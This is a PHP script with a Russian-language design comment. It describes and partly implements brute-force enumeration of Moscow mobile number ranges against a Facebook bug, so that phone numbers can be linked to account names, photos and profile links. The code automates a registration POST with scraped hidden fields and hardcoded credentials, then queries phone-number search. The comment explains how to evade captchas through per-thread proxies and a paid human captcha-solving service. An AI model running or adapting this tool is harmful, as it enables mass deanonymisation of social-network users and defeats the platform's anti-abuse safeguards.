<?php
/***************************************************
Логика работы следующая. У facebook есть маленький баг, который не заметен с первого взгляда, с помощью него мы получаем информацию о пользователе (фото, ссылка, имя) по номеру телефона. Таким образом задача сводиться к перебору номеров. 
Таргетинг перебора сводиться до операторов мобильной связи, соответственно например для получения всех аккаунтов facebook и сопоставлении их с номерами телефонов необходимо перебрать все мобильные номера Москвы. 
В этом нам помогает сайт http://www.statkod.ru/moskva_mobile1.html , который более того сужает зону перебора до конкретных пулов номеров.
Для больших пулов номеров (>2 000 000) имеет смысл использовать адаптивный перебор. 
В таком случае алгоритм ищет концентрации номеров телефонов, однако находит только 85%-95% аккаунтов.

Главная проблема заключается в том что при большом количестве запросов с одного IP адреса, либо при совпадении информации в cookie файлах при запросе – facebook с завидной регулярностью выдает капчи.
Для решения данной задачи было изучено множество программного обеспечениея которое позволяет решать капчи. Однако приемлимого результата добиться не удалось. 
Лучшее программное обеспечение, лицензия на которое стоит 600$ - решало только 1 из 15 капч такого типа верно. В таком случае facebook всё равно отдавал новые капчи, пока не решит две подряд, а такое бывало только 1 раз.
Таким образом было принято решение что для решения данной необходимо подключать живых людей, которые будут решать данные капчи. 
Были проверены все сервисы предоставляющие такие возможности, лучшим из них оказался https://anti-captcha.com/ , работаем с ними через API, посылая картинку, и отправляя каждые 5 секунд запрос на результат решения капчи. 
Для этого используется библиотека anticaptcha.php.
Стоимость исходя из тестирования на основе перебора 3.5 миллионов номеров телефонов по Москва составила 0.042 рубля за 1 пользователя facebook.

Переходим непосредственно к скрипту.
Скрипт написан на PHP. 

Для более быстрого перебора номеров телефонов используется несколько потоков (parser.php - … - parser11.php)
Каждый поток должен работать со своим файлом cookie и captcha. 
Каждый поток должен работать через свой proxy-сервер, иначе количество капч увеличиться в разы.

Настройки для каждого потока:
$icount=1; // Режим работы 1 - с серверного IP, 2 - через прокси из файла
$tel_code='7952'; //Код телефонного оператора + начало номера
$tel_start=2688946; //Номер от которого перебираем
$tel_end=2688956; //Номер до которого перебираем

***************************************************/


ini_set("max_execution_time", "12000000");
//include 'simple_html_dom.php'; - не используем т.к. без неё - быстрее

$url = 'https://www.facebook.com/reg/';// ссылка по которой обращаемся к фейсбуку
$ch = curl_init();
$header  = array
(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
'Accept-Encoding: gzip, deflate', // указываем серверу, что ответ надо сжимать
'Content-type: application/x-www-form-urlencoded'
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_URL, $url); // ссылка по которой обращаемся к фейсбуку
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); // следовать за редиректами
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);// таймаут 30 сек
curl_setopt($ch, CURLOPT_REFERER, "https://www.facebook.com/");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);// отключаем проверку сертификата
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate'); // указивает curl что ответ может быть сжат
curl_setopt($ch, CURLOPT_POST, 0); // использовать данные в post
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_COOKIEFILE,  dirname(__FILE__).'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__).'/cookie.txt'); // сохран¤ть куки в файл



// получаем HTML код страницы
$html = curl_exec($ch); 
//echo $html;













/*
<form method="post" id="reg" name="reg" action="https://m.facebook.com/reg/" onsubmit="return function(event){return false;}.call(this,event)!==false &amp;&amp; window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)">
<input type="hidden" name="lsd" value="AVoUDnX9" autocomplete="off"><div id="reg_form_box" class="large_form"><div id="fullname_field" class="_1ixn"><div class="clearfix _58mh"><div class="mbm _1iy_ _a4y _3-90 lfloat _ohe"><div class="_5dbb _5634" id="u_0_g"><div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput"><div class="placeholder" aria-hidden="true">Имя</div>
<input type="text" class="inputtext _58mg _5dba _2ph-" data-type="text" name="firstname" value="" aria-required="1" placeholder="" aria-label="Имя" id="u_0_h" aria-describedby="js_1o"></div><i class="_5dbc img sp_bFCDkdc7DZE_1_5x sx_16e271"></i><i class="_5dbd img sp_bFCDkdc7DZE_1_5x sx_10bd2a"></i><div class="_1pc_"></div></div></div><div class="mbm _1iy_ _a4y rfloat _ohf"><div class="_5dbb" id="u_0_i"><div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput"><div class="placeholder" aria-hidden="true">Фамилия</div>
<input type="text" class="inputtext _58mg _5dba _2ph-" data-type="text" name="lastname" value="" aria-required="1" placeholder="" aria-label="Фамилия" id="u_0_j"></div><i class="_5dbc img sp_bFCDkdc7DZE_1_5x sx_16e271"></i><i class="_5dbd img sp_bFCDkdc7DZE_1_5x sx_10bd2a"></i><div class="_1pc_"></div></div></div></div><div class="_1pc_" id="fullname_error_msg"></div></div><div class="mbm _a4y" id="u_0_k"><div class="_5dbb" id="u_0_l"><div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput"><div class="placeholder" aria-hidden="true">Номер мобильного телефона или эл. адрес</div>
<input type="text" class="inputtext _58mg _5dba _2ph-" data-type="text" name="reg_email__" aria-required="1" placeholder="" aria-label="Номер мобильного телефона или эл. адрес" id="u_0_m"></div><i class="_5dbc img sp_bFCDkdc7DZE_1_5x sx_16e271"></i><i class="_5dbd img sp_bFCDkdc7DZE_1_5x sx_10bd2a"></i><div class="_1pc_"></div></div></div><div class="hidden_elem" id="u_0_n" style="opacity: 1e-05;"><div class="mbm _a4y"><div class="_5dbb" id="u_0_o"><div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput"><div class="placeholder" aria-hidden="true">Повторно введите ваш эл. адрес</div>
<input type="text" class="inputtext _58mg _5dba _2ph-" data-type="text" name="reg_email_confirmation__" aria-required="1" placeholder="" aria-label="Повторно введите ваш эл. адрес" id="u_0_p"></div><i class="_5dbc img sp_bFCDkdc7DZE_1_5x sx_16e271"></i><i class="_5dbd img sp_bFCDkdc7DZE_1_5x sx_10bd2a"></i><div class="_1pc_"></div></div></div></div><div class="mbm _br- _a4y hidden_elem" id="u_0_q"><div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput"><div class="placeholder" aria-hidden="true">Моб. телефон</div>
<input type="text" class="inputtext _58mg _5dba _2ph-" data-type="text" name="reg_second_contactpoint__" placeholder="" aria-label="Моб. телефон" id="u_0_r"></div></div><div class="mbm _br- _a4y" id="password_field"><div class="_5dbb" id="u_0_s"><div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput"><div class="placeholder" aria-hidden="true">Новый пароль</div>
<input type="password" class="inputtext _58mg _5dba _2ph-" data-type="password" autocomplete="new-password" name="reg_passwd__" aria-required="1" placeholder="" aria-label="Новый пароль" id="u_0_t"></div><i class="_5dbc img sp_bFCDkdc7DZE_1_5x sx_16e271"></i><i class="_5dbd img sp_bFCDkdc7DZE_1_5x sx_10bd2a"></i><div class="_1pc_"></div></div></div><div class="_58mq _5dbb" id="u_0_u"><div class="mtm mbs _2_68">Дата рождения</div><div class="_5k_5"><span class="_5k_4" data-type="selectors" data-name="birthday_wrapper" id="u_0_v"><span><select aria-label="День" name="birthday_day" id="day" title="День" class="_5dba"><option value="0">День</option><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29" selected="1">29</option><option value="30">30</option><option value="31">31</option></select><select aria-label="Месяц" name="birthday_month" id="month" title="Месяц" class="_5dba"><option value="0">Месяц</option><option value="1">янв.</option><option value="2">февр.</option><option value="3" selected="1">марта</option><option value="4">апр.</option><option value="5">мая</option><option value="6">июня</option><option value="7">июля</option><option value="8">авг.</option><option value="9">сент.</option><option value="10">окт.</option><option value="11">нояб.</option><option value="12">дек.</option></select><select aria-label="Год" name="birthday_year" id="year" title="Год" class="_5dba"><option value="0">Год</option><option value="2018">2018</option><option value="2017">2017</option><option value="2016">2016</option><option value="2015">2015</option><option value="2014">2014</option><option value="2013">2013</option><option value="2012">2012</option><option value="2011">2011</option><option value="2010">2010</option><option value="2009">2009</option><option value="2008">2008</option><option value="2007">2007</option><option value="2006">2006</option><option value="2005">2005</option><option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993" selected="1">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option><option value="1912">1912</option><option value="1911">1911</option><option value="1910">1910</option><option value="1909">1909</option><option value="1908">1908</option><option value="1907">1907</option><option value="1906">1906</option><option value="1905">1905</option></select></span></span><a class="_58ms mlm" id="birthday-help" href="#" ajaxify="/help/ajax/reg_birthday/" title="Подробнее" rel="async" role="button">Зачем указывать дату рождения?</a><i class="_5dbc _5k_6 img sp_bFCDkdc7DZE_1_5x sx_16e271"></i><i class="_5dbd _5k_7 img sp_bFCDkdc7DZE_1_5x sx_10bd2a"></i><div class="_1pc_"></div></div></div><div class="mtm _5wa2 _5dbb" id="u_0_w"><span class="_5k_3" data-type="radio" data-name="gender_wrapper" id="u_0_x"><span class="_5k_2 _5dba">
<input type="radio" name="sex" value="1" id="u_0_4"><label class="_58mt" for="u_0_4">Женщина</label></span><span class="_5k_2 _5dba">
<input type="radio" name="sex" value="2" id="u_0_5"><label class="_58mt" for="u_0_5">Мужчина</label></span></span><i class="_5dbc _5k_6 img sp_bFCDkdc7DZE_1_5x sx_16e271"></i><i class="_5dbd _5k_7 img sp_bFCDkdc7DZE_1_5x sx_10bd2a"></i><div class="_1pc_"></div></div><div class="_58mu" data-nocookies="1" id="u_0_y"><p class="_58mv">Нажимая «Создать аккаунт», вы соглашаетесь с нашими <a href="/legal/terms" id="terms-link" target="_blank" rel="nofollow">Условиями использования</a> и подтверждаете, что ознакомились с нашей <a href="/about/privacy" id="privacy-link" target="_blank" rel="nofollow">Политикой использования данных</a>, включая <a href="/policies/cookies/" id="cookie-use-link" target="_blank" rel="nofollow">применение файлов «cookie»</a>. Вы можете получать SMS-уведомления от Facebook, от которых можете отказаться в любой момент.</p></div><div class="clearfix"><button type="submit" class="_6j mvm _6wk _6wl _58mi _6o _6v" name="websubmit" id="u_0_z">Создать аккаунт</button><span class="hidden_elem _58ml" id="u_0_10"><img class="img" src="https://static.xx.fbcdn.net/rsrc.php/v3/yg/r/KERGZ2Gd4En.gif" alt="" width="16" height="10"></span></div></div>
<input type="hidden" autocomplete="off" id="referrer" name="referrer" value="">
<input type="hidden" autocomplete="off" id="asked_to_login" name="asked_to_login" value="0">
<input type="hidden" autocomplete="off" id="terms" name="terms" value="on">
<input type="hidden" autocomplete="off" id="ns" name="ns" value="0">
<input type="hidden" autocomplete="off" id="ri" name="ri" value="d79df6bf-2b1c-f4f5-44ef-30ab0f5225d9">
<input type="hidden" autocomplete="off" id="invid" name="invid" value="">
<input type="hidden" autocomplete="off" id="a" name="a" value="">
<input type="hidden" autocomplete="off" id="oi" name="oi" value="">
<input type="hidden" autocomplete="off" id="locale" name="locale" value="ru_RU">
<input type="hidden" autocomplete="off" id="app_bundle" name="app_bundle" value="">
<input type="hidden" autocomplete="off" id="app_data" name="app_data" value="">
<input type="hidden" autocomplete="off" id="reg_data" name="reg_data" value="">
<input type="hidden" autocomplete="off" id="app_id" name="app_id" value="">
<input type="hidden" autocomplete="off" id="fbpage_id" name="fbpage_id" value="">
<input type="hidden" autocomplete="off" id="reg_oid" name="reg_oid" value="">
<input type="hidden" autocomplete="off" id="reg_instance" name="reg_instance" value="Zd-8Wl8gIqwOLurnqfMpAqdm">
<input type="hidden" autocomplete="off" id="openid_token" name="openid_token" value="">
<input type="hidden" autocomplete="off" id="uo_ip" name="uo_ip" value="">
<input type="hidden" autocomplete="off" id="key" name="key" value="">
<input type="hidden" autocomplete="off" id="re" name="re" value="">
<input type="hidden" autocomplete="off" id="mid" name="mid" value="">
<input type="hidden" autocomplete="off" id="fid" name="fid" value="">
<input type="hidden" autocomplete="off" id="reg_dropoff_id" name="reg_dropoff_id" value="">
<input type="hidden" autocomplete="off" id="reg_dropoff_code" name="reg_dropoff_code" value="">
<input type="hidden" autocomplete="off" id="contactpoint_label" name="contactpoint_label" value="email_or_phone">
<input type="hidden" autocomplete="off" id="ignore" name="ignore" value="reg_email_confirmation__|reg_second_contactpoint__"><div id="reg_captcha" class="_58mw hidden_elem"><div><h2 id="security_check_header">Проверка безопасности</h2><div id="outer_captcha_box"><div id="captcha_box"><div class="field_error hidden_elem" id="captcha_response_error">Обязательно для заполнения.</div><div id="captcha" class="captcha" data-captcha-class="TFBCaptcha"><div>Введите указанный ниже код</div>
<input type="hidden" autocomplete="off" id="captcha_persist_data" name="captcha_persist_data" value="AZkB-wAIWJMLDxRZDRqZSCT6GkQ37OcMvfW-ACpj5iqvWy-IGwoFjT45xqNGgQzXPfGWYfVEN8oJ_Um2GuP-_z8ZhL9kSE4UusJUUgC7n4NAVruhstsUJFkcZubMIhguedTxEiiv_dPpqEIsga2E33tfN4M8GLSOLtJ9KYNLXKwJ5ipxsKXWW07M9hLFp34lH11wNagIH-F1VQoZ87DWxqtlp_Cv1QftDIteP6uXA2tLreZTlhSt1lzDCCjTnfQZ0Wf_j7mHg1epOY0w74m5uCWAYdmsQldF-u7v_VUfUrx2GXfdkfynS-1JNmhdOL7LcGAGozUmg6T_WS9DXipHhz2lg_5exknTroezJCcvt0bEuaLRO3xky0R15QC-jox72U6ecPWiJOGY1aJ4z0uDMigEsNa9QdBQ0Zow1uiB-Jm13f2LveANpH9sbzU537w2FYIJtXuVu3wjbRh9uP7F8k0LmqG6RVXcOqPRB-Pu0rNyTRiIGt6iXeQQRFvWnboBOMfO93gmbqEFtWjffYe0zsK7"><img class="img" src="https://www.facebook.com/captcha/tfbimage.php?captcha_challenge_code=1522331906-4f2718abbaf9583c441e6f3e53a01bdd&amp;captcha_challenge_hash=AZmrZR_ve_FmEggg0aC4QdvJsTYkp7Qoypa5LSqW3rnYcchXl49m9v8Mr6ur6KH1DygjII2g4YipPxgMlOtfWvxR6shjx-RWOFg4EYLDKvvBLzvgEM6u9-A_W9GL2Ks87UJJggCnIGW5IA5_92FY9KdPFEooDwsL_f7a7WMtB51Ij6MXxlLbzPylbPoG4FflN7I" alt="Если изображение не загружается, необходимо обновить данную страницу в вашем обозревателе."><div class="captcha_refresh">Не можете прочитать текст?<br><a onclick="captchaRefresh(&quot;TFBCaptcha&quot;, 1); return false;" href="#" role="button">Try another code</a><span id="captcha_throbber" class="tfbcaptcha_inline_throbber"><img class="mls uiLoadingIndicatorAsync img" src="https://static.xx.fbcdn.net/rsrc.php/v3/yg/r/KERGZ2Gd4En.gif" alt="" width="16" height="10"></span></div><div class="captcha_input"><div class="field_container">
<input type="text" class="inputtext" name="captcha_response" id="captcha_response" autocomplete="off" aria-label="Используется капча. Чтобы продолжить, введите указанные выше слова. Вы также можете попробовать пройти аудиотест, нажав на ссылку выше. Нажмите кнопку «Воспроизвести», чтобы прослушать запись, а затем введите услышанные слова в это поле."></div><a href="#" onclick="CSS.show($('captcha_whats_this')); return false;" role="button">Почему я это вижу?</a><div id="captcha_whats_this" class="hidden_elem"><div class="fsl fwb">Проверка безопасности</div>This is a standard security test that we use to make sure accounts are authentic.</div></div></div></div></div><div id="captcha_buttons" class="_58p2 clearfix hidden_elem"><div class="_58mx _58mm"><div class="_58mz"> &nbsp; </div><a class="_58my" href="#" role="button" id="u_0_11">Назад</a></div><div class="_58mm"><div class="clearfix"><button type="submit" class="_6j mvm _6wk _6wl _58me _58mi _6o _6v" id="u_0_12">Регистрация</button><span class="hidden_elem _58ml" id="u_0_13"><img class="img" src="https://static.xx.fbcdn.net/rsrc.php/v3/yg/r/KERGZ2Gd4En.gif" alt="" width="16" height="10"></span></div></div></div></div></div>


<input type="hidden" autocomplete="off" id="mid" name="mid" value="">
<input type="hidden" name="skstamp" value="eyJyb3VuZHMiOjUsInNlZWQiOiJhODIyYzRhOGFiOTYzMjU1ODc3NmZhMWRjYzVmM2I5MSIsInNlZWQyIjoiYmI1MDJjZmZiM2UwZjY5Y2I2NzAzNmM2OTc1YzgxZjEiLCJoYXNoIjoiOTllNjUxNjM2ZjgxYTI0Mjk4OWY3MjRlMzQ5ZDZkODEiLCJoYXNoMiI6IjMyYjRmODhmMzdkYjZkYjE3MmQyODczODVkZGU3MzZlIiwidGltZV90YWtlbiI6MTAwMDAsInN1cmZhY2UiOiJyZWdpc3RyYXRpb24ifQ=="></form>
*/
//
$temp = substr(strstr($html, 'name="lsd" value="'), 18, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['lsd'] = $temp;
//
$post_data['firstname'] = 'Иван';
$post_data['lastname'] = 'Ивасенкова';
$post_data['reg_email__'] = 'ivanidzeze@yandex.ru';
$post_data['reg_email_confirmation__'] = 'ivanidzeze@yandex.ru';
$post_data['reg_second_contactpoint__'] = '';
$post_data['reg_passwd__'] = 'Ivanidzeze228';
$post_data['birthday_day'] = '12';
$post_data['birthday_month'] = '11';
$post_data['birthday_year'] = '1993';
$post_data['sex'] = '2';
//
$temp = substr(strstr($html, 'name="referrer" value="'), 23, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['referrer'] = $temp;
//
$temp = substr(strstr($html, 'name="asked_to_login" value="'), 29, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['asked_to_login'] = $temp;
//
$temp = substr(strstr($html, 'name="terms" value="'), 20, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['terms'] = $temp;
//
$temp = substr(strstr($html, 'name="ns" value="'), 17, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['ns'] = $temp;
//
$temp = substr(strstr($html, 'name="ri" value="'), 17, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['ri'] = $temp;
//
$temp = substr(strstr($html, 'name="invid" value="'), 20, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['invid'] = $temp;
//
$temp = substr(strstr($html, 'name="a" value="'), 16, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['a'] = $temp;
//
$temp = substr(strstr($html, 'name="oi" value="'), 17, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['oi'] = $temp;
//
$temp = substr(strstr($html, 'name="locale" value="'), 21, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['locale'] = $temp;
//
$temp = substr(strstr($html, 'name="app_bundle" value="'), 25, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['app_bundle'] = $temp;
//
$temp = substr(strstr($html, 'name="app_data" value="'), 23, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['app_data'] = $temp;
//
$temp = substr(strstr($html, 'name="reg_data" value="'), 23, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['reg_data'] = $temp;
//
$temp = substr(strstr($html, 'name="app_id" value="'), 21, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['app_id'] = $temp;
//
$temp = substr(strstr($html, 'name="fbpage_id" value="'), 24, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['fbpage_id'] = $temp;
//
$temp = substr(strstr($html, 'name="reg_oid" value="'), 22, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['reg_oid'] = $temp;
//
$temp = substr(strstr($html, 'name="reg_instance" value="'), 27, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['reg_instance'] = $temp;
//
$temp = substr(strstr($html, 'name="openid_token" value="'), 27, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['openid_token'] = $temp;
//
$temp = substr(strstr($html, 'name="uo_ip" value="'), 20, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['uo_ip'] = $temp;
//
$temp = substr(strstr($html, 'name="key" value="'), 18, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['key'] = $temp;
//
$temp = substr(strstr($html, 'name="re" value="'), 17, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['re'] = $temp;
//
$temp = substr(strstr($html, 'name="mid" value="'), 18, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['mid'] = $temp;
//
$temp = substr(strstr($html, 'name="fid" value="'), 18, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['fid'] = $temp;
//
$temp = substr(strstr($html, 'name="reg_dropoff_id" value="'), 29, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['reg_dropoff_id'] = $temp;
//
$temp = substr(strstr($html, 'name="reg_dropoff_code" value="'), 31, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['reg_dropoff_code'] = $temp;
//
$temp = substr(strstr($html, 'name="contactpoint_label" value="'), 33, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['contactpoint_label'] = $temp;
//
$temp = substr(strstr($html, 'name="ignore" value="'), 21, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['ignore'] = $temp;
//
$temp = substr(strstr($html, 'name="captcha_persist_data" value="'), 35, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['captcha_persist_data'] = $temp;
//
//$temp = substr(strstr($html, 'name="captcha_response" value="'), 31, strlen($html));  
//$temp = stristr($temp, '"', true);
$post_data['captcha_response'] = '';
//
$temp = substr(strstr($html, 'name="skstamp" value="'), 22, strlen($html));  
$temp = stristr($temp, '"', true);
$post_data['skstamp'] = $temp;

foreach ( $post_data as $key => $value) 
{
    $post_items[] = $key . '=' . $value;
	echo $key.' '.$value.'<br>';
}
$post_string = implode ('&', $post_items);




$number='79522688944';
$url = 'https://www.facebook.com/ajax/register.php';// ссылка по которой обращаемся к фейсбуку
$ch = curl_init();
$header  = array
(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
'Accept-Encoding: gzip, deflate', // указываем серверу, что ответ надо сжимать
'Content-type: application/x-www-form-urlencoded'
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_URL, $url); // ссылка по которой обращаемся к фейсбуку
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); // следовать за редиректами
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);// таймаут 30 сек
curl_setopt($ch, CURLOPT_REFERER, "https://www.facebook.com/reg/");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);// отключаем проверку сертификата
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate'); // указивает curl что ответ может быть сжат
curl_setopt($ch, CURLOPT_POST, 1); // использовать данные в post
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_string);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE,  dirname(__FILE__).'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__).'/cookie.txt'); // сохран¤ть куки в файл



// получаем HTML код страницы
$html = curl_exec($ch); 
//echo $html;




$number='79522688944';
$url = 'https://www.facebook.com/search/top/?q=%2B'.$number;// ссылка по которой обращаемся к фейсбуку
$ch = curl_init();
$header  = array
(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
'Accept-Encoding: gzip, deflate', // указываем серверу, что ответ надо сжимать
'Content-type: application/x-www-form-urlencoded'
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_URL, $url); // ссылка по которой обращаемся к фейсбуку
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); // следовать за редиректами
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);// таймаут 30 сек
curl_setopt($ch, CURLOPT_REFERER, "https://www.facebook.com/reg/");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);// отключаем проверку сертификата
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate'); // указивает curl что ответ может быть сжат
curl_setopt($ch, CURLOPT_POST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE,  dirname(__FILE__).'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__).'/cookie.txt'); // сохран¤ть куки в файл

// получаем HTML код страницы
$html = curl_exec($ch); 
echo $html;

?>


